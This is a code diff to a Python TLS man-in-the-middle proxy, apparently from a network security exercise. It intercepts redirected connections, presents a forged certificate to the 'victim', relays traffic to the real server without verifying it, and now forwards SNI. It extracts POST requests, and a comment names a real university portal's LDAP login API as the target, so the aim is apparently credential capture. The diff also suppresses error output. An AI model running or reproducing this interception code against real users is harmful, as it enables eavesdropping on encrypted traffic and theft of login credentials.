@@ -18,7 +18,6 @@ def main():
     target_ip = sys.argv[1]
     target_interface = sys.argv[2]
     bugging_port = 8080
-    # create a bugging port
     try:
 
         server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -34,6 +33,8 @@ def main():
         print(f"Error setting up server: {e}")
     finally:
         server_socket.close()
+def sni_callback(sock, server_name, context):
+    sock.sni = server_name
 
 def proxy_handler(client_conn, addr):
     try:
@@ -41,17 +42,22 @@ def proxy_handler(client_conn, addr):
         dst_addr = client_conn.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)
         dst_ip = socket.inet_ntoa(dst_addr[4:8])
         dst_port = struct.unpack('!H', dst_addr[2:4])[0]
-        print(f"TLS Connection Established : [{dst_ip}:{dst_port}]") 
+        hostname = dst_ip
 
         # connect to victim
         context_client = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
         context_client.load_cert_chain(certfile="../certificates/host.crt", keyfile="../certificates/host.key")
+        context_client.set_servername_callback(sni_callback)
         tls_client_sock = context_client.wrap_socket(client_conn, server_side=True) 
+
+        hostname = getattr(tls_client_sock, 'sni', None) or dst_ip
 
         # connect to server
         remote_socket = socket.create_connection((dst_ip, dst_port))
         context_remote = ssl._create_unverified_context()
-        tls_remote_sock = context_remote.wrap_socket(remote_socket, server_hostname=None)
+        tls_remote_sock = context_remote.wrap_socket(remote_socket, server_hostname=hostname)
+        print(f"TLS Connection Established : [{dst_ip}:{dst_port}]") 
+
 
         # forward data
         t1 = threading.Thread(target=piping, args=(tls_client_sock, tls_remote_sock, True))
@@ -59,7 +65,8 @@ def proxy_handler(client_conn, addr):
         t1.start()
         t2.start()
     except Exception as e:
-        print(f"Error handling client connection: {e}")
+        #print(f"Error handling client connection: {e}")
+        pass
     finally:
         client_conn.close()
 
@@ -93,7 +100,8 @@ def piping(src, dst, extract=False):
                     extract_queue.put(full_request)
                     buffer = buffer[total_length:]
     except Exception as e:
-        print(f"Error in piping: {e}")
+        #print(f"Error in piping: {e}")
+        pass
     finally:
         src.close()
         dst.close()
@@ -113,7 +121,7 @@ def extract_packets(data):
         decoded_data = data.decode('utf-8', errors='ignore')
         lines = decoded_data.split("\r\n")
         if lines and lines[0].startswith("POST"):
-            # 请求行格式：POST //portal.nycu.edu.tw/portal/api/PortalLdapLogin HTTP/1.1
+            # POST //portal.nycu.edu.tw/portal/api/PortalLdapLogin
             parts = lines[0].split()
             if len(parts) >= 2:
                 url = parts[1]
